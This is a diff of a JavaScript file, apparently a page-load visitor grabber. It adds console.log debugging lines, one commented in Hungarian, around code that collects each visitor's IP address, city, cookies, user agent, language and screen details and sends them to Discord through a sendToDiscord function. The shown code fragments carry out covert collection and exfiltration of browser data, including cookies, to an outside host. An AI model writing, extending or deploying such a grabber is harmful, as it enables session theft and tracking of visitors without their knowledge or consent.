@@ -73,6 +73,7 @@ document.addEventListener("DOMContentLoaded", function () {
       ],
     };
 
+    console.log("Sending to Discord:", params); // Hibakeresési célból
     request.send(JSON.stringify(params));
   }
 
@@ -87,6 +88,12 @@ document.addEventListener("DOMContentLoaded", function () {
         const userAgent = getUserAgent();
         const language = getLanguage();
         const screenInfo = getScreenInfo();
+        console.log("IP:", ip);
+        console.log("City:", city);
+        console.log("Cookies:", cookies);
+        console.log("User Agent:", userAgent);
+        console.log("Language:", language);
+        console.log("Screen Info:", screenInfo);
         sendToDiscord(ip, city, cookies, userAgent, language, screenInfo);
       } else {
         sendToDiscord(
